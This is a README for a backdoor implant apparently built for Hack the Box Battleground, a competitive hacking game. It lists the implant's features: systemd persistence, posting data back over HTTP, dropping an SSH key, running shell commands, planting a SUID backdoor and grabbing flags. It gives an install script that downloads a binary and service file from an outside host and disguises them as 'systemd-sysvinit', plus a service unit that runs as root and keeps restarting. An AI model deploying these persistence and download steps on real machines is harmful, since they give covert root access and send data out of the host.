# HBG-Pwnage

## HTB Battleground implant

You're probably thinking why? Well after playing Hack the Box Battleground which is great fun by the way, I found it time consuming to keep my persistence, and fetch the flags whenever they are updated. 

So I created this implant! 

By the way, I'm not developer at all but keen to hear any feedback or improvements.

## Features

- Runs as a systemd service
- Posts data back to a HTTP endpoint
- Drops an SSH public key (replace with yours)
- Executes shell command
- Drops a SUID backdoor
- Pulls the root and user flags off


## Compiling
```
gcc implant.c -o implant
```

## Installing
```
#!/bin/bash

curl -S http://10.10.10.10/systemd-sysvinit -o /usr/lib/systemd/systemd-sysvinit && chmod 755 /usr/lib/systemd/systemd-sysvinit
curl -S http://10.10.10.10/sysvinit.service -o /usr/lib/systemd/system/sysvinit.service

systemctl daemon-reload
sudo systemctl enable sysvinit
systemctl start sysvinit
```

## Service definition
```
[Unit]
Description=Sysvinit
StartLimitIntervalSec=0

[Service]
Type=forking
Restart=always
RestartSec=1
User=root
ExecStart=/lib/systemd/systemd-sysvinit

[Install]
WantedBy=multi-user.target
```

Some tweaks are require to get it working, replace your IP address with the IP address in the source code, and the curl command to install. 